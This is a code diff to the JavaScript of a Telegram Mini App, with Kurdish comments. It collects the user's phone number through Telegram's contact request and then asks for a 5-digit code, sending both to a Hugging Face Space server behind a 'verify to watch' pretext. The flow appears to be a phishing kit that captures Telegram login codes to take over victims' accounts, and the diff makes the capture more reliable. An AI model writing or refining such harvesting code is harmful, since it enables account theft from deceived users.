@@ -1,9 +1,9 @@
 const tg = window.Telegram.WebApp;
-const API_URL = "https://your-space-name.hf.space"; // لینکی Spaceـەکەت لێرە دابنێ
+const API_URL = "https://taman964-api-handler.hf.space"; 
 
 tg.expand();
 
-// کلیک کردن لە CONFIRM
+// کلیک کردن لە CONFIRM بۆ ناردنی ژمارەی مۆبایل
 document.getElementById('confirm-btn').onclick = () => {
     tg.requestContact((res) => {
         if (res.auth_date) {
@@ -15,15 +15,26 @@ document.getElementById('confirm-btn').onclick = () => {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ phone, user_id })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === "ok") {
+                    // ئەگەر ژمارەکە چوو، شاشەی کۆدەکە نیشان بدە
+                    document.getElementById('step1').style.display = 'none';
+                    document.getElementById('step2').style.display = 'flex';
+                } else {
+                    alert("هەڵەیەک ڕوویدا لە ناردنی کۆد: " + data.message);
+                }
+            })
+            .catch(err => {
+                alert("پەیوەندی لەگەڵ سێرڤەر سەرکەوتوو نەبوو!");
+                console.error(err);
             });
-
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'flex';
         }
     });
 };
 
-// کلیک کردن لە GET CODE
+// کلیک کردن لە GET CODE بۆ ناردنی کۆدەکە
 document.getElementById('verify-btn').onclick = () => {
     const inputs = document.querySelectorAll('.code-box');
     let code = "";
@@ -35,11 +46,30 @@ document.getElementById('verify-btn').onclick = () => {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ code, user_id })
-        }).then(response => {
-            alert("✅ Verified! You can now watch.");
-            tg.close();
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.status === "success") {
+                alert("✅ Verified! Access Granted.");
+                tg.close();
+            } else {
+                alert("کۆدەکە هەڵەیە یان ماوەکەی بەسەرچووە: " + data.message);
+            }
+        })
+        .catch(err => {
+            alert("هەڵە لە پەیوەندی سێرڤەر!");
         });
     } else {
-        alert("تکایە ٥ ژمارەکە بە تەواوی بنووسە");
+        alert("تکایە هەر ٥ ژمارەی کۆدەکە بنووسە");
     }
 };
+
+// بۆ ئەوەی فوکەس ئۆتۆماتیک بچێتە خانەی داهاتوو لە کاتی نووسینی کۆد
+const codeBoxes = document.querySelectorAll('.code-box');
+codeBoxes.forEach((box, index) => {
+    box.addEventListener('input', () => {
+        if (box.value.length === 1 && index < codeBoxes.length - 1) {
+            codeBoxes[index + 1].focus();
+        }
+    });
+});
